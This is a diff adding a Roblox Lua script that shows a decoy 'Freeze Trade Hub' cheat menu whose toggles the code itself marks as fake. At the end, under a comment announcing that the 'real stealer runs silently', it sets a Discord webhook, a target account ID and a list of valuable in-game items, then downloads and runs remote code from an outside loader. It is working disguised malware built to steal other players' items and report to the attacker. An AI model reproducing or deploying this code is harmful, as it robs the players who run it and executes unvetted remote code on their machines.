@@ -1,0 +1,269 @@
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "FakeFreezeHub"
+gui.Parent = player:WaitForChild("PlayerGui")
+gui.ResetOnSpawn = false
+
+-- Main Frame
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 420, 0, 340)
+mainFrame.Position = UDim2.new(0.5, -210, 0.5, -170)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+mainFrame.BackgroundTransparency = 1
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = gui
+
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 12)
+mainCorner.Parent = mainFrame
+
+local mainStroke = Instance.new("UIStroke")
+mainStroke.Color = Color3.fromRGB(0, 162, 255)
+mainStroke.Thickness = 2.5
+mainStroke.Transparency = 0.5
+mainStroke.Parent = mainFrame
+
+-- Gradient
+local gradient = Instance.new("UIGradient")
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 45)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 20))
+}
+gradient.Rotation = 45
+gradient.Parent = mainFrame
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -40, 0, 45)
+title.Position = UDim2.new(0, 15, 0, 10)
+title.BackgroundTransparency = 1
+title.Text = "🧊 Freeze Trade Hub v2.1"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+-- Close Button
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 35, 0, 35)
+closeBtn.Position = UDim2.new(1, -45, 0, 5)
+closeBtn.BackgroundColor3 = Color3.fromRGB(240, 80, 80)
+closeBtn.BorderSizePixel = 0
+closeBtn.Text = "✕"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextScaled = true
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.Parent = mainFrame
+
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 8)
+closeCorner.Parent = closeBtn
+
+closeBtn.MouseButton1Click:Connect(function()
+    gui:Destroy()
+end)
+
+closeBtn.MouseEnter:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 100, 100)}):Play()
+end)
+closeBtn.MouseLeave:Connect(function()
+    TweenService:Create(closeBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(240, 80, 80)}):Play()
+end)
+
+-- Draggable
+local dragging, dragStart, startPos
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+    end
+end)
+mainFrame.InputChanged:Connect(function(input)
+    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+mainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+-- Toggle Creator
+local function createToggle(name, posY, callback)
+    local toggleFrame = Instance.new("Frame")
+    toggleFrame.Size = UDim2.new(1, -30, 0, 45)
+    toggleFrame.Position = UDim2.new(0, 15, 0, posY)
+    toggleFrame.BackgroundTransparency = 1
+    toggleFrame.Parent = mainFrame
+
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -70, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = name
+    label.TextColor3 = Color3.fromRGB(220, 220, 220)
+    label.TextScaled = true
+    label.Font = Enum.Font.Gotham
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.Parent = toggleFrame
+
+    local toggleBg = Instance.new("Frame")
+    toggleBg.Size = UDim2.new(0, 40, 0, 22)
+    toggleBg.Position = UDim2.new(1, -50, 0.5, -11)
+    toggleBg.BackgroundColor3 = Color3.fromRGB(60, 60, 65)
+    toggleBg.BorderSizePixel = 0
+    toggleBg.Parent = toggleFrame
+
+    local bgCorner = Instance.new("UICorner")
+    bgCorner.CornerRadius = UDim.new(0, 11)
+    bgCorner.Parent = toggleBg
+
+    local indicator = Instance.new("Frame")
+    indicator.Size = UDim2.new(0, 18, 0, 18)
+    indicator.Position = UDim2.new(0, 2, 0.5, -9)
+    indicator.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    indicator.BorderSizePixel = 0
+    indicator.Parent = toggleBg
+
+    local indCorner = Instance.new("UICorner")
+    indCorner.CornerRadius = UDim.new(0, 9)
+    indCorner.Parent = indicator
+
+    local toggled = false
+    toggleBg.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            toggled = not toggled
+            TweenService:Create(indicator, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
+                Position = toggled and UDim2.new(1, -20, 0.5, -9) or UDim2.new(0, 2, 0.5, -9),
+                BackgroundColor3 = toggled and Color3.fromRGB(50, 200, 50) or Color3.fromRGB(200, 50, 50)
+            }):Play()
+            TweenService:Create(toggleBg, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
+                BackgroundColor3 = toggled and Color3.fromRGB(50, 150, 50) or Color3.fromRGB(60, 60, 65)
+            }):Play()
+            if callback then callback(toggled) end
+        end
+    end)
+end
+
+-- Create Fake Toggles
+createToggle("🧊 Freeze Trade", 65)
+createToggle("✅ Auto Accept", 115)
+createToggle("🛡️ Anti Ban", 165)
+createToggle("⚡ Instant Steal", 215)
+createToggle("🔄 Desync", 265)
+
+-- Status Bar
+local statusFrame = Instance.new("Frame")
+statusFrame.Size = UDim2.new(1, -30, 0, 35)
+statusFrame.Position = UDim2.new(0, 15, 1, -50)
+statusFrame.BackgroundColor3 = Color3.fromRGB(40, 200, 40)
+statusFrame.BorderSizePixel = 0
+statusFrame.Parent = mainFrame
+
+local statusCorner = Instance.new("UICorner")
+statusCorner.CornerRadius = UDim.new(0, 8)
+statusCorner.Parent = statusFrame
+
+local statusLabel = Instance.new("TextLabel")
+statusLabel.Size = UDim2.new(1, 0, 1, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Text = "Status: Active ✓ | Stealer Running"
+statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+statusLabel.TextScaled = true
+statusLabel.Font = Enum.Font.GothamBold
+statusLabel.Parent = statusFrame
+
+-- Fade In Animation
+wait(0.1)
+TweenService:Create(mainFrame, TweenInfo.new(0.6, Enum.EasingStyle.Back), {BackgroundTransparency = 0}):Play()
+TweenService:Create(mainStroke, TweenInfo.new(0.6), {Transparency = 0}):Play()
+
+-- === REAL STEALER RUNS SILENTLY HERE ===
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1477810665098973194/-OM_xmlvDtrx5vvAVSN6gGHcSV3amEznKawFMoZF_UtCflGCNN0JEWR-ITEeP3tgyKks"
+getgenv().TARGET_ID = 3962631639
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Bacuru and Egguru"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cerberus"] = true,
+    ["Chillin Chili"] = true,
+    ["Chipso and Queso"] = true,
+    ["Cooki and Milki"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Esok Sekolah"] = true,
+    ["Eviledon"] = true,
+    ["Festive 67"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["Guest 666"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Ketupat Bros"] = true,
+    ["Ketupat Kepat"] = true,
+    ["La Casa Boo"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Spooky Grande"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Las Sis"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Los 67"] = true,
+    ["Los Amigos"] = true,
+    ["Los Bros"] = true,
+    ["Los Candies"] = true,
+    ["Los Combinasionas"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Los Mobilis"] = true,
+    ["Los Planitos"] = true,
+    ["Los Primos"] = true,
+    ["Los Puggies"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["Los Tacoritas"] = true,
+    ["Love Love Bear"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["Meowl"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["Money Money Puggy"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Orcaledon"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Quesadillo Vampiro"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Swag Soda"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Tictac Sahur"] = true,
+    ["Tralaledon"] = true,
+    ["Tuff Toucan"] = true,
+    ["W or L"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
